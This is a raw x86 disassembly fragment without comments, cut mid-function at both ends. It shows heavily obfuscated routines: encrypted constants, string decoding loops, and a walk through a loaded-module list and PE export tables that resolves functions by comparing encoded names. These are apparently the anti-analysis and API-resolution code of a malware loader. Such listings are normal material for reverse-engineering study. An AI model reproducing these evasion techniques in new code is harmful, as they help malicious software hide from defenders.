  4221cc:	xor    esi,ecx
  4221ce:	cmp    esi,eax
  4221d0:	jne    0x4221fb
  4221d2:	mov    eax,DWORD PTR [ebp-0x30]
  4221d5:	mov    esi,DWORD PTR [ebp-0x1c]
  4221d8:	xor    eax,ecx
  4221da:	add    eax,0x3272fa
  4221df:	xor    esi,ecx
  4221e1:	add    esi,edx
  4221e3:	imul   esi,eax
  4221e6:	mov    eax,DWORD PTR [ebp-0x10]
  4221e9:	movzx  eax,WORD PTR [esi+eax*1]
  4221ed:	mov    esi,DWORD PTR [ebp-0xc]
  4221f0:	sub    eax,edx
  4221f2:	xor    eax,ecx
  4221f4:	cmp    eax,esi
  4221f6:	mov    eax,DWORD PTR [ebp-0xc]
  4221f9:	je     0x4221fe
  4221fb:	mov    eax,DWORD PTR [ebp-0x18]
  4221fe:	pop    edi
  4221ff:	xor    eax,ecx
  422201:	pop    esi
  422202:	add    eax,edx
  422204:	pop    ebx
  422205:	leave  
  422206:	ret    0x8
  422209:	push   ebp
  42220a:	mov    ebp,esp
  42220c:	push   ecx
  42220d:	mov    cx,WORD PTR [eax]
  422210:	push   esi
  422211:	mov    esi,0x3b5f
  422216:	sub    cx,si
  422219:	mov    esi,0x8a9d
  42221e:	xor    cx,si
  422221:	mov    esi,0x4e3c
  422226:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42222d:	mov    edx,0xf89c85b5
  422232:	cmp    cx,si
  422235:	je     0x422294
  422237:	push   ebx
  422238:	push   edi
  422239:	movzx  ecx,cx
  42223c:	mov    edi,0xffcd8d06
  422241:	mov    esi,0x75108b3
  422246:	mov    ebx,0x4e60
  42224b:	cmp    cx,bx
  42224e:	jne    0x422253
  422250:	mov    DWORD PTR [ebp-0x4],edx
  422253:	lea    edx,[edi+0x1]
  422256:	xor    edx,esi
  422258:	mov    edi,edx
  42225a:	xor    edi,esi
  42225c:	mov    cx,WORD PTR [eax+edi*2+0x64e5f4]
  422264:	mov    ebx,0x3b5f
  422269:	sub    cx,bx
  42226c:	mov    ebx,0x8a9d
  422271:	xor    cx,bx
  422274:	mov    ebx,0x4e3c
  422279:	cmp    cx,bx
  42227c:	jne    0x422246
  42227e:	mov    ecx,DWORD PTR [ebp-0x4]
  422281:	pop    edi
  422282:	pop    ebx
  422283:	cmp    ecx,0xf89c85b6
  422289:	je     0x422294
  42228b:	xor    ecx,esi
  42228d:	lea    eax,[eax+ecx*2+0x64e5f6]
  422294:	pop    esi
  422295:	leave  
  422296:	ret    
  422297:	push   ebp
  422298:	mov    ebp,esp
  42229a:	push   ecx
  42229b:	push   esi
  42229c:	push   edi
  42229d:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  4222a4:	mov    esi,0xf89c85b5
  4222a9:	call   0x422209
  4222ae:	mov    edi,eax
  4222b0:	mov    al,BYTE PTR [edi]
  4222b2:	sub    al,0x6
  4222b4:	xor    al,0x81
  4222b6:	cmp    al,0x7b
  4222b8:	je     0x42231b
  4222ba:	mov    eax,edi
  4222bc:	mov    edx,0xffcd8d06
  4222c1:	mov    ecx,0x75108b3
  4222c6:	push   ebx
  4222c7:	mov    ax,WORD PTR [eax]
  4222ca:	mov    ebx,0x3b5f
  4222cf:	sub    ax,bx
  4222d2:	mov    ebx,0x8a9d
  4222d7:	xor    ax,bx
  4222da:	mov    ebx,0x4e52
  4222df:	cmp    ax,bx
  4222e2:	jne    0x4222e7
  4222e4:	mov    DWORD PTR [ebp-0x4],esi
  4222e7:	lea    esi,[edx+0x1]
  4222ea:	xor    esi,ecx
  4222ec:	mov    edx,esi
  4222ee:	xor    edx,ecx
  4222f0:	lea    eax,[edi+edx*2+0x64e5f4]
  4222f7:	mov    bl,BYTE PTR [eax]
  4222f9:	sub    bl,0x6
  4222fc:	xor    bl,0x81
  4222ff:	cmp    bl,0x7b
  422302:	jne    0x4222c7
  422304:	mov    eax,DWORD PTR [ebp-0x4]
  422307:	pop    ebx
  422308:	cmp    eax,0xf89c85b6
  42230d:	je     0x42231b
  42230f:	xor    eax,ecx
  422311:	xor    ecx,ecx
  422313:	mov    WORD PTR [edi+eax*2+0x64e5f4],cx
  42231b:	mov    eax,edi
  42231d:	pop    edi
  42231e:	pop    esi
  42231f:	leave  
  422320:	ret    
  422321:	push   ebp
  422322:	mov    ebp,esp
  422324:	push   ecx
  422325:	push   esi
  422326:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42232d:	mov    esi,0xf89c85b5
  422332:	call   0x422209
  422337:	mov    cx,WORD PTR [eax]
  42233a:	mov    edx,0x3b5f
  42233f:	sub    cx,dx
  422342:	mov    edx,0x8a9d
  422347:	xor    cx,dx
  42234a:	mov    edx,0x4e3c
  42234f:	cmp    cx,dx
  422352:	je     0x4223ab
  422354:	push   ebx
  422355:	push   edi
  422356:	movzx  ecx,cx
  422359:	mov    edx,0xffcd8d06
  42235e:	mov    edi,0x75108b3
  422363:	mov    ebx,0x4e52
  422368:	cmp    cx,bx
  42236b:	jne    0x422370
  42236d:	mov    DWORD PTR [ebp-0x4],esi
  422370:	lea    esi,[edx+0x1]
  422373:	xor    esi,edi
  422375:	mov    edx,esi
  422377:	xor    edx,edi
  422379:	mov    cx,WORD PTR [eax+edx*2+0x64e5f4]
  422381:	mov    ebx,0x3b5f
  422386:	sub    cx,bx
  422389:	mov    ebx,0x8a9d
  42238e:	xor    cx,bx
  422391:	mov    ebx,0x4e3c
  422396:	cmp    cx,bx
  422399:	jne    0x422363
  42239b:	cmp    DWORD PTR [ebp-0x4],0xf89c85b6
  4223a2:	pop    edi
  4223a3:	pop    ebx
  4223a4:	je     0x4223ab
  4223a6:	xor    eax,eax
  4223a8:	inc    eax
  4223a9:	jmp    0x4223ad
  4223ab:	xor    eax,eax
  4223ad:	pop    esi
  4223ae:	leave  
  4223af:	ret    
  4223b0:	push   ebp
  4223b1:	mov    ebp,esp
  4223b3:	push   ecx
  4223b4:	mov    eax,DWORD PTR [ebp+0x8]
  4223b7:	movzx  ecx,WORD PTR [eax]
  4223ba:	push   esi
  4223bb:	lea    eax,[ecx-0x3b5f]
  4223c1:	mov    esi,0x8a9d
  4223c6:	push   edi
  4223c7:	xor    eax,esi
  4223c9:	mov    edi,0x4e3c
  4223ce:	mov    DWORD PTR [ebp-0x4],edx
  4223d1:	cmp    ax,di
  4223d4:	je     0x422401
  4223d6:	mov    eax,DWORD PTR [ebp+0x8]
  4223d9:	sub    eax,edx
  4223db:	mov    DWORD PTR [ebp+0x8],eax
  4223de:	jmp    0x4223e3
  4223e0:	mov    eax,DWORD PTR [ebp+0x8]
  4223e3:	mov    WORD PTR [edx],cx
  4223e6:	add    edx,0x2
  4223e9:	movzx  edi,WORD PTR [eax+edx*1]
  4223ed:	mov    ecx,edi
  4223ef:	add    edi,0xffffc4a1
  4223f5:	xor    edi,esi
  4223f7:	mov    eax,0x4e3c
  4223fc:	cmp    di,ax
  4223ff:	jne    0x4223e0
  422401:	xor    eax,eax
  422403:	pop    edi
  422404:	mov    WORD PTR [edx],ax
  422407:	mov    eax,DWORD PTR [ebp-0x4]
  42240a:	pop    esi
  42240b:	leave  
  42240c:	ret    0x4
  42240f:	push   ebp
  422410:	mov    ebp,esp
  422412:	sub    esp,0x18
  422415:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  42241c:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  422423:	mov    ecx,DWORD PTR [ebp-0x8]
  422426:	push   esi
  422427:	mov    eax,0x75108b3
  42242c:	xor    ecx,eax
  42242e:	mov    esi,0x3272fa
  422433:	add    ecx,esi
  422435:	mov    DWORD PTR [ebp-0x4],ecx
  422438:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42243f:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  422446:	push   edi
  422447:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  42244e:	jmp    0x4224ef
  422453:	mov    ecx,DWORD PTR [ebp-0x4]
  422456:	mov    edx,DWORD PTR [ebp+0x10]
  422459:	sub    edx,ecx
  42245b:	mov    ecx,DWORD PTR [ebp-0xc]
  42245e:	xor    ecx,eax
  422460:	add    ecx,esi
  422462:	cmp    edx,ecx
  422464:	jbe    0x422481
  422466:	mov    edx,DWORD PTR [ebp-0x4]
  422469:	add    edx,DWORD PTR [ebp+0x8]
  42246c:	mov    ecx,DWORD PTR [ebp-0x4]
  42246f:	add    ecx,DWORD PTR [ebp+0xc]
  422472:	mov    edi,DWORD PTR [ecx]
  422474:	mov    DWORD PTR [edx],edi
  422476:	mov    ecx,DWORD PTR [ecx+0x4]
  422479:	mov    DWORD PTR [edx+0x4],ecx
  42247c:	mov    ecx,DWORD PTR [ebp-0xc]
  42247f:	jmp    0x4224ce
  422481:	mov    ecx,DWORD PTR [ebp-0x4]
  422484:	mov    edx,DWORD PTR [ebp+0x10]
  422487:	sub    edx,ecx
  422489:	mov    ecx,DWORD PTR [ebp-0x10]
  42248c:	xor    ecx,eax
  42248e:	add    ecx,esi
  422490:	cmp    edx,ecx
  422492:	mov    ecx,DWORD PTR [ebp-0x4]
  422495:	jbe    0x4224a9
  422497:	add    ecx,DWORD PTR [ebp+0x8]
  42249a:	mov    edx,DWORD PTR [ebp-0x4]
  42249d:	add    edx,DWORD PTR [ebp+0xc]
  4224a0:	mov    edx,DWORD PTR [edx]
  4224a2:	mov    DWORD PTR [ecx],edx
  4224a4:	mov    ecx,DWORD PTR [ebp-0x10]
  4224a7:	jmp    0x4224ce
  4224a9:	mov    edx,DWORD PTR [ebp+0x10]
  4224ac:	sub    edx,ecx
  4224ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4224b1:	xor    ecx,eax
  4224b3:	add    ecx,esi
  4224b5:	cmp    edx,ecx
  4224b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4224ba:	jbe    0x4224df
  4224bc:	add    ecx,DWORD PTR [ebp+0x8]
  4224bf:	mov    edx,DWORD PTR [ebp-0x4]
  4224c2:	add    edx,DWORD PTR [ebp+0xc]
  4224c5:	mov    dx,WORD PTR [edx]
  4224c8:	mov    WORD PTR [ecx],dx
  4224cb:	mov    ecx,DWORD PTR [ebp-0x14]
  4224ce:	mov    edx,DWORD PTR [ebp-0x4]
  4224d1:	xor    ecx,eax
  4224d3:	lea    ecx,[ecx+edx*1+0x3272fa]
  4224da:	mov    DWORD PTR [ebp-0x4],ecx
  4224dd:	jmp    0x4224ef
  4224df:	add    ecx,DWORD PTR [ebp+0x8]
  4224e2:	mov    edx,DWORD PTR [ebp-0x4]
  4224e5:	add    edx,DWORD PTR [ebp+0xc]
  4224e8:	mov    dl,BYTE PTR [edx]
  4224ea:	mov    BYTE PTR [ecx],dl
  4224ec:	inc    DWORD PTR [ebp-0x4]
  4224ef:	mov    ecx,DWORD PTR [ebp-0x18]
  4224f2:	mov    edx,DWORD PTR [ebp+0x10]
  4224f5:	xor    ecx,eax
  4224f7:	add    ecx,esi
  4224f9:	imul   ecx,edx
  4224fc:	mov    edx,DWORD PTR [ebp-0x8]
  4224ff:	mov    edi,DWORD PTR [ebp-0x4]
  422502:	xor    edx,eax
  422504:	lea    edx,[edx+edi*1+0x3272fa]
  42250b:	cmp    edx,ecx
  42250d:	jb     0x422453
  422513:	pop    edi
  422514:	pop    esi
  422515:	leave  
  422516:	ret    0xc
  422519:	push   ebp
  42251a:	mov    ebp,esp
  42251c:	sub    esp,0xc
  42251f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  422526:	push   esi
  422527:	mov    esi,eax
  422529:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  422530:	mov    edx,DWORD PTR [ebp-0x4]
  422533:	mov    eax,0x75108b3
  422538:	xor    edx,eax
  42253a:	mov    ecx,0x3272fa
  42253f:	add    edx,ecx
  422541:	cmp    esi,edx
  422543:	je     0x422585
  422545:	push   ebx
  422546:	push   edi
  422547:	mov    edx,DWORD PTR [ebp-0x8]
  42254a:	mov    ebx,DWORD PTR [ebp+0x8]
  42254d:	xor    edx,eax
  42254f:	mov    edi,0xffcd8d06
  422554:	sub    edi,edx
  422556:	add    esi,edi
  422558:	lea    edx,[esi-0x3272fa]
  42255e:	xor    edx,eax
  422560:	mov    DWORD PTR [ebp-0xc],edx
  422563:	mov    edx,DWORD PTR [ebp-0x4]
  422566:	mov    edi,DWORD PTR [ebp-0xc]
  422569:	xor    dl,0xb3
  42256c:	sub    dl,0x6
  42256f:	xor    edi,eax
  422571:	mov    BYTE PTR [edi+ebx*1+0x3272fa],dl
  422578:	mov    edx,DWORD PTR [ebp-0x4]
  42257b:	xor    edx,eax
  42257d:	add    edx,ecx
  42257f:	cmp    esi,edx
  422581:	jne    0x422547
  422583:	pop    edi
  422584:	pop    ebx
  422585:	pop    esi
  422586:	leave  
  422587:	ret    0x4
  42258a:	push   ebp
  42258b:	mov    ebp,esp
  42258d:	sub    esp,0x21c
  422593:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42259a:	mov    DWORD PTR [ebp-0x14],0xf89c85b4
  4225a1:	mov    eax,DWORD PTR [ebp+0x10]
  4225a4:	mov    eax,DWORD PTR [ebp-0x4]
  4225a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4225aa:	push   esi
  4225ab:	push   edi
  4225ac:	mov    edi,0x75108b3
  4225b1:	xor    eax,edi
  4225b3:	mov    esi,0x3272fa
  4225b8:	add    eax,esi
  4225ba:	cmp    eax,ecx
  4225bc:	mov    eax,DWORD PTR [ebp-0x4]
  4225bf:	jne    0x4225ca
  4225c1:	xor    eax,edi
  4225c3:	add    eax,esi
  4225c5:	jmp    0x422676
  4225ca:	mov    ecx,DWORD PTR [ebp+0xc]
  4225cd:	xor    eax,edi
  4225cf:	add    eax,esi
  4225d1:	cmp    eax,ecx
  4225d3:	jne    0x4225da
  4225d5:	mov    eax,DWORD PTR [ebp-0x4]
  4225d8:	jmp    0x4225c1
  4225da:	lea    eax,[ebp-0x21c]
  4225e0:	mov    DWORD PTR [ebp-0x8],eax
  4225e3:	mov    eax,DWORD PTR [ebp+0xc]
  4225e6:	mov    DWORD PTR [ebp-0x10],eax
  4225e9:	mov    eax,DWORD PTR [ebp-0x4]
  4225ec:	xor    eax,edi
  4225ee:	add    eax,esi
  4225f0:	mov    DWORD PTR [ebp+0x10],eax
  4225f3:	mov    eax,DWORD PTR [ebp+0xc]
  4225f6:	push   ebx
  4225f7:	call   0x422321
  4225fc:	mov    ebx,eax
  4225fe:	mov    eax,DWORD PTR [ebp+0x8]
  422601:	mov    eax,DWORD PTR [eax+0x14]
  422604:	jmp    0x42265e
  422606:	mov    eax,DWORD PTR [ebp+0xc]
  422609:	sub    eax,0x8
  42260c:	mov    DWORD PTR [ebp-0xc],eax
  42260f:	mov    eax,DWORD PTR [ebp-0xc]
  422612:	mov    eax,DWORD PTR [eax+0x28]
  422615:	call   0x422209
  42261a:	mov    DWORD PTR [ebp+0x10],eax
  42261d:	push   DWORD PTR [ebp+0x10]
  422620:	mov    edx,DWORD PTR [ebp-0x8]
  422623:	call   0x4223b0
  422628:	mov    eax,DWORD PTR [ebp-0x4]
  42262b:	xor    eax,edi
  42262d:	add    eax,esi
  42262f:	cmp    eax,ebx
  422631:	jne    0x42263b
  422633:	mov    eax,DWORD PTR [ebp-0x8]
  422636:	call   0x422297
  42263b:	mov    eax,DWORD PTR [ebp-0x14]
  42263e:	xor    eax,edi
  422640:	add    eax,esi
  422642:	push   eax
  422643:	push   DWORD PTR [ebp-0x10]
  422646:	mov    eax,DWORD PTR [ebp-0x8]
  422649:	call   0x421fc3
  42264e:	mov    ecx,DWORD PTR [ebp-0x4]
  422651:	xor    ecx,edi
  422653:	add    ecx,esi
  422655:	cmp    eax,ecx
  422657:	je     0x42267c
  422659:	mov    eax,DWORD PTR [ebp+0xc]
  42265c:	mov    eax,DWORD PTR [eax]
  42265e:	mov    DWORD PTR [ebp+0xc],eax
  422661:	mov    eax,DWORD PTR [ebp+0x8]
  422664:	mov    ecx,DWORD PTR [ebp+0xc]
  422667:	add    eax,0x14
  42266a:	cmp    ecx,eax
  42266c:	jne    0x422606
  42266e:	mov    eax,DWORD PTR [ebp-0x4]
  422671:	xor    eax,edi
  422673:	add    eax,esi
  422675:	pop    ebx
  422676:	pop    edi
  422677:	pop    esi
  422678:	leave  
  422679:	ret    0xc
  42267c:	mov    eax,DWORD PTR [ebp-0xc]
  42267f:	mov    eax,DWORD PTR [eax+0x18]
  422682:	jmp    0x422675
  422684:	push   ebp
  422685:	mov    ebp,esp
  422687:	mov    eax,DWORD PTR [ebp+0xc]
  42268a:	sub    esp,0x10
  42268d:	cmp    DWORD PTR [ebp+0x8],0x0
  422691:	push   ebx
  422692:	push   esi
  422693:	push   edi
  422694:	je     0x422749
  42269a:	test   eax,eax
  42269c:	je     0x422749
  4226a2:	movzx  eax,WORD PTR [eax+0x20]
  4226a6:	mov    ecx,eax
  4226a8:	mov    DWORD PTR [ebp-0x10],eax
  4226ab:	xor    edx,edx
  4226ad:	and    DWORD PTR [ebp-0x8],edx
  4226b0:	mov    eax,0x8a9d
  4226b5:	xor    ecx,eax
  4226b7:	add    ecx,0x3b5f
  4226bd:	mov    DWORD PTR [ebp-0xc],ecx
  4226c0:	and    DWORD PTR [ebp-0x4],0x0
  4226c4:	xor    ecx,ecx
  4226c6:	push   0x7d
  4226c8:	pop    edi
  4226c9:	cmp    cx,WORD PTR [ebp-0xc]
  4226cd:	jae    0x422733
  4226cf:	lea    esi,[edx-0x3b5f]
  4226d5:	xor    esi,eax
  4226d7:	movzx  ecx,WORD PTR [ebp-0x4]
  4226db:	mov    ebx,DWORD PTR [ebp+0xc]
  4226de:	lea    ecx,[ebx+ecx*4]
  4226e1:	cmp    WORD PTR [ecx+0x2],si
  4226e5:	jne    0x42271e
  4226e7:	movzx  ecx,WORD PTR [ecx]
  4226ea:	mov    edi,0x4e3c
  4226ef:	cmp    cx,di
  4226f2:	jne    0x422700
  4226f4:	mov    ebx,DWORD PTR [ebp+0x8]
  4226f7:	movzx  edi,dx
  4226fa:	cmp    BYTE PTR [edi+ebx*1],0x0
  4226fe:	je     0x42272d
  422700:	mov    ebx,DWORD PTR [ebp+0x8]
  422703:	movzx  edi,dx
  422706:	movsx  di,BYTE PTR [edi+ebx*1]
  42270b:	mov    ebx,0x3b5f
  422710:	sub    di,bx
  422713:	xor    di,ax
  422716:	cmp    cx,di
  422719:	je     0x42272d
  42271b:	push   0x7b
  42271d:	pop    edi
  42271e:	inc    DWORD PTR [ebp-0x4]
  422721:	mov    cx,WORD PTR [ebp-0xc]
  422725:	cmp    WORD PTR [ebp-0x4],cx
  422729:	jb     0x4226d7
  42272b:	jmp    0x422733
  42272d:	inc    DWORD PTR [ebp-0x8]
  422730:	push   0x7a
  422732:	pop    edi
  422733:	mov    esi,DWORD PTR [ebp+0x8]
  422736:	movzx  ecx,dx
  422739:	cmp    BYTE PTR [ecx+esi*1],0x0
  42273d:	je     0x422752
  42273f:	inc    edx
  422740:	cmp    edi,0x7b
  422743:	jne    0x4226c0
  422749:	xor    eax,eax
  42274b:	pop    edi
  42274c:	pop    esi
  42274d:	pop    ebx
  42274e:	leave  
  42274f:	ret    0x8
  422752:	mov    ecx,DWORD PTR [ebp-0x8]
  422755:	add    ecx,0xffffc4a1
  42275b:	xor    cx,ax
  42275e:	xor    eax,eax
  422760:	cmp    cx,WORD PTR [ebp-0x10]
  422764:	sete   al
  422767:	jmp    0x42274b
  422769:	push   ebp
  42276a:	mov    ebp,esp
  42276c:	sub    esp,0x50
  42276f:	push   edi
  422770:	mov    edi,eax
  422772:	mov    eax,DWORD PTR [edi+0x1a8]
  422778:	cmp    DWORD PTR [eax],0x0
  42277b:	jne    0x422784
  42277d:	xor    eax,eax
  42277f:	jmp    0x4228b5
  422784:	push   DWORD PTR [ebp+0x8]
  422787:	push   0x2c
  422789:	pop    eax
  42278a:	call   0x422519
  42278f:	mov    edx,DWORD PTR [edi+0x1ac]
  422795:	lea    eax,[edi+0x22]
  422798:	mov    DWORD PTR [ebp-0x4c],eax
  42279b:	lea    eax,[edi+0x44]
  42279e:	mov    DWORD PTR [ebp-0x48],eax
  4227a1:	lea    eax,[edi+0x66]
  4227a4:	mov    DWORD PTR [ebp-0x44],eax
  4227a7:	lea    eax,[edi+0x88]
  4227ad:	mov    DWORD PTR [ebp-0x40],eax
  4227b0:	lea    eax,[edi+0xaa]
  4227b6:	mov    DWORD PTR [ebp-0x3c],eax
  4227b9:	lea    eax,[edi+0xcc]
  4227bf:	mov    DWORD PTR [ebp-0x38],eax
  4227c2:	lea    eax,[edi+0xee]
  4227c8:	mov    DWORD PTR [ebp-0x34],eax
  4227cb:	lea    eax,[edi+0x110]
  4227d1:	mov    DWORD PTR [ebp-0x30],eax
  4227d4:	lea    eax,[edi+0x132]
  4227da:	mov    DWORD PTR [ebp-0x2c],eax
  4227dd:	lea    eax,[edi+0x154]
  4227e3:	push   edi
  4227e4:	mov    DWORD PTR [ebp-0x50],edi
  4227e7:	mov    DWORD PTR [ebp-0x28],eax
  4227ea:	call   0x4228e9
  4227ef:	push   eax
  4227f0:	mov    eax,DWORD PTR [edi+0x1a8]
  4227f6:	push   DWORD PTR [eax]
  4227f8:	call   0x42258a
  4227fd:	mov    DWORD PTR [ebp-0x10],eax
  422800:	test   eax,eax
  422802:	je     0x4228b5
  422808:	mov    ecx,DWORD PTR [eax+0x3c]
  42280b:	push   ebx
  42280c:	push   esi
  42280d:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  422811:	add    esi,eax
  422813:	mov    edi,DWORD PTR [esi+0x24]
  422816:	mov    ecx,DWORD PTR [esi+0x1c]
  422819:	mov    edx,DWORD PTR [esi+0x20]
  42281c:	mov    ebx,DWORD PTR [esi+0x18]
  42281f:	add    edi,eax
  422821:	mov    DWORD PTR [ebp-0x20],edi
  422824:	mov    edi,DWORD PTR [esi+0x14]
  422827:	add    ecx,eax
  422829:	add    edx,eax
  42282b:	mov    DWORD PTR [ebp-0xc],ecx
  42282e:	mov    DWORD PTR [ebp-0x1c],edx
  422831:	mov    DWORD PTR [ebp-0x8],edi
  422834:	cmp    edi,ebx
  422836:	ja     0x42283b
  422838:	mov    DWORD PTR [ebp-0x8],ebx
  42283b:	xor    ebx,ebx
  42283d:	mov    DWORD PTR [ebp-0x18],ebx
  422840:	cmp    DWORD PTR [ebp-0x8],ebx
  422843:	jbe    0x4228b3
  422845:	jmp    0x42284a
  422847:	mov    edx,DWORD PTR [ebp-0x1c]
  42284a:	mov    edi,DWORD PTR [ebp-0x20]
  42284d:	movzx  edi,WORD PTR [edi+ebx*2]
  422851:	cmp    ebx,DWORD PTR [esi+0x18]
  422854:	jae    0x4228b3
  422856:	cmp    edi,DWORD PTR [esi+0x14]
  422859:	jae    0x4228b3
  42285b:	mov    ebx,DWORD PTR [edx+ebx*4]
  42285e:	mov    edx,DWORD PTR [ebp+0x8]
  422861:	mov    edi,DWORD PTR [ecx+edi*4]
  422864:	mov    DWORD PTR [ebp-0x4],edx
  422867:	lea    edx,[ebp-0x50]
  42286a:	add    ebx,eax
  42286c:	add    edi,eax
  42286e:	sub    edx,DWORD PTR [ebp+0x8]
  422871:	mov    DWORD PTR [ebp-0x14],0xb
  422878:	mov    DWORD PTR [ebp-0x24],edx
  42287b:	mov    edx,DWORD PTR [ebp-0x4]
  42287e:	cmp    DWORD PTR [edx],0x0
  422881:	jne    0x42289e
  422883:	mov    eax,DWORD PTR [ebp-0x24]
  422886:	push   DWORD PTR [eax+edx*1]
  422889:	push   ebx
  42288a:	call   0x422684
  42288f:	mov    ecx,DWORD PTR [ebp-0xc]
  422892:	test   eax,eax
  422894:	je     0x42289b
  422896:	mov    eax,DWORD PTR [ebp-0x4]
  422899:	mov    DWORD PTR [eax],edi
  42289b:	mov    eax,DWORD PTR [ebp-0x10]
  42289e:	add    DWORD PTR [ebp-0x4],0x4
  4228a2:	dec    DWORD PTR [ebp-0x14]
  4228a5:	jne    0x42287b
  4228a7:	mov    ebx,DWORD PTR [ebp-0x18]
  4228aa:	inc    ebx
  4228ab:	mov    DWORD PTR [ebp-0x18],ebx
  4228ae:	cmp    ebx,DWORD PTR [ebp-0x8]
  4228b1:	jb     0x422847
  4228b3:	pop    esi
  4228b4:	pop    ebx
  4228b5:	pop    edi
  4228b6:	leave  
  4228b7:	ret    0x4
  4228ba:	push   ebp
  4228bb:	mov    ebp,esp
  4228bd:	mov    eax,DWORD PTR [ebp+0x8]
  4228c0:	push   esi
  4228c1:	push   DWORD PTR [eax+0x1e0]
  4228c7:	lea    esi,[eax+0x198]
  4228cd:	mov    eax,DWORD PTR [ebp+0x8]
  4228d0:	call   0x422769
  4228d5:	mov    ecx,DWORD PTR [esi]
  4228d7:	mov    DWORD PTR [ecx],eax
  4228d9:	mov    eax,DWORD PTR [esi]
  4228db:	xor    ecx,ecx
  4228dd:	cmp    DWORD PTR [eax],ecx
  4228df:	pop    esi
  4228e0:	setne  cl
  4228e3:	mov    eax,ecx
  4228e5:	pop    ebp
  4228e6:	ret    0x4
  4228e9:	mov    ecx,DWORD PTR [edi+0x188]
  4228ef:	push   ebx
  4228f0:	jmp    0x422905
  4228f2:	xor    eax,0x8a9d
  4228f7:	add    eax,0x3b5f
  4228fc:	mov    WORD PTR [ecx],ax
  4228ff:	add    ecx,0x2
  422902:	add    edx,0x2
  422905:	movzx  eax,WORD PTR [edx]
  422908:	mov    ebx,0x4e3c
  42290d:	cmp    ax,bx
  422910:	jne    0x4228f2
  422912:	xor    eax,eax
  422914:	mov    WORD PTR [ecx],ax
  422917:	mov    eax,DWORD PTR [edi+0x188]
  42291d:	pop    ebx
  42291e:	ret    
  42291f:	push   edi
  422920:	mov    edi,eax
  422922:	mov    eax,DWORD PTR [esi+0x188]
  422928:	shl    edi,0x6
  42292b:	add    eax,edi
  42292d:	jmp    0x422939
  42292f:	xor    cl,0x81
  422932:	add    cl,0x6
  422935:	mov    BYTE PTR [eax],cl
  422937:	inc    eax
  422938:	inc    edx
  422939:	mov    cl,BYTE PTR [edx]
  42293b:	cmp    cl,0x7b
  42293e:	jne    0x42292f
  422940:	mov    BYTE PTR [eax],0x0
  422943:	mov    eax,DWORD PTR [esi+0x188]
  422949:	add    eax,edi
  42294b:	pop    edi
  42294c:	ret    
  42294d:	push   ebp
  42294e:	mov    ebp,esp
  422950:	sub    esp,0x14
  422953:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42295a:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  422961:	mov    eax,DWORD PTR [ebx]
  422963:	mov    DWORD PTR [ebp-0x8],eax
  422966:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42296d:	push   esi
  42296e:	push   edi
  42296f:	mov    DWORD PTR [ebp-0x14],0xead71895
  422976:	mov    edi,DWORD PTR [ebp-0x4]
  422979:	mov    ecx,DWORD PTR [ebp-0x10]
  42297c:	mov    eax,0x75108b3
  422981:	xor    edi,eax
  422983:	mov    edx,0x3272fa
  422988:	xor    ecx,eax
  42298a:	add    edi,edx
  42298c:	add    ecx,edx
  42298e:	imul   edi,ecx
  422991:	jmp    0x4229d9
  422993:	mov    ecx,DWORD PTR [ebp-0x8]
  422996:	mov    esi,DWORD PTR [ebp-0x4]
  422999:	xor    ecx,eax
  42299b:	xor    esi,eax
  42299d:	add    ecx,edx
  42299f:	add    esi,edx
  4229a1:	test   esi,ecx
  4229a3:	mov    esi,DWORD PTR [ebp-0x8]
  4229a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4229a9:	je     0x4229c0
  4229ab:	xor    ecx,eax
  4229ad:	xor    esi,eax
  4229af:	add    ecx,edx
  4229b1:	add    esi,edx
  4229b3:	shr    esi,cl
  4229b5:	mov    ecx,DWORD PTR [ebp-0x14]
  4229b8:	xor    ecx,eax
  4229ba:	add    ecx,edx
  4229bc:	xor    esi,ecx
  4229be:	jmp    0x4229ca
  4229c0:	xor    esi,eax
  4229c2:	xor    ecx,eax
  4229c4:	add    esi,edx
  4229c6:	add    ecx,edx
  4229c8:	shr    esi,cl
  4229ca:	mov    DWORD PTR [ebp-0x8],esi
  4229cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4229d0:	xor    ecx,eax
  4229d2:	lea    edi,[edi+ecx*1+0x3272fa]
  4229d9:	mov    ecx,DWORD PTR [ebp-0xc]
  4229dc:	mov    esi,DWORD PTR [ebp-0x4]
  4229df:	xor    esi,eax
  4229e1:	xor    ecx,eax
  4229e3:	sub    ecx,esi
  4229e5:	cmp    edi,ecx
  4229e7:	jbe    0x422993
  4229e9:	mov    eax,DWORD PTR [ebp-0x8]
  4229ec:	pop    edi
  4229ed:	mov    DWORD PTR [ebx],eax
  4229ef:	mov    eax,DWORD PTR [ebp-0x8]
  4229f2:	pop    esi
  4229f3:	leave  
  4229f4:	ret    
  4229f5:	push   ebp
  4229f6:	mov    ebp,esp
  4229f8:	sub    esp,0x38
  4229fb:	push   ebx
  4229fc:	mov    ebx,0xf89c85b5
  422a01:	mov    DWORD PTR [ebp-0x4],ebx
  422a04:	lea    ecx,[ebx-0x1]
  422a07:	mov    DWORD PTR [ebp-0x24],ecx
  422a0a:	mov    eax,DWORD PTR [ebp-0x4]
  422a0d:	mov    edx,DWORD PTR [ebp+0x8]
  422a10:	push   esi
  422a11:	mov    esi,0x75108b3
  422a16:	xor    eax,esi
  422a18:	push   edi
  422a19:	mov    edi,0x3272fa
  422a1e:	add    eax,edi
  422a20:	cmp    edx,eax
  422a22:	mov    eax,DWORD PTR [ebp-0x4]
  422a25:	je     0x422b8a
  422a2b:	mov    edx,DWORD PTR [ebp+0xc]
  422a2e:	xor    eax,esi
  422a30:	add    eax,edi
  422a32:	cmp    edx,eax
  422a34:	je     0x422b87
